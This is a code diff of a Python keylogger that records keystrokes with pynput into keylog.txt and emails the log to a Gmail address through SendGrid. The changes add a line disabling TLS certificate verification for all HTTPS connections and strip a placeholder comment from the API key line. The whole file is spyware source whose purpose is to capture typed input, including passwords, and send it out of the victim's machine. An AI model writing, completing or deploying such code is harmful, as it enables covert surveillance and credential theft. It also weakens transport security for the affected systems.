@@ -1,12 +1,15 @@
-import base64, pynput, sendgrid, os
+import base64, pynput, sendgrid, os, ssl
 from pynput.keyboard import Key, Listener
 from sendgrid.helpers.mail import Mail, Attachment, FileContent, FileName, FileType, Disposition
 
 # File to log the typed keys
 log_file = "keylog.txt"
 
+# Create an unverified SSL context
+ssl._create_default_https_context = ssl._create_unverified_context
+
 # SendGrid API configuration
-SENDGRID_API_KEY = '*'  # Replace with your actual SendGrid API key
+SENDGRID_API_KEY = '*'
 SENDGRID_FROM_EMAIL = 'testingxmyxcases@gmail.com'
 SENDGRID_TO_EMAIL = 'testingxmyxcases@gmail.com'
 SENDGRID_SUBJECT = "Log File"
@@ -50,9 +53,10 @@ def on_release(key):
         send_email_with_sendgrid();
         return False
 
-# Function to create the email based on env variables and send it
+# Function called in order to send email
 def send_email_with_sendgrid():
     sg = sendgrid.SendGridAPIClient(api_key=SENDGRID_API_KEY)
+    
     message = Mail(
         from_email=SENDGRID_FROM_EMAIL,
         to_emails=SENDGRID_TO_EMAIL,
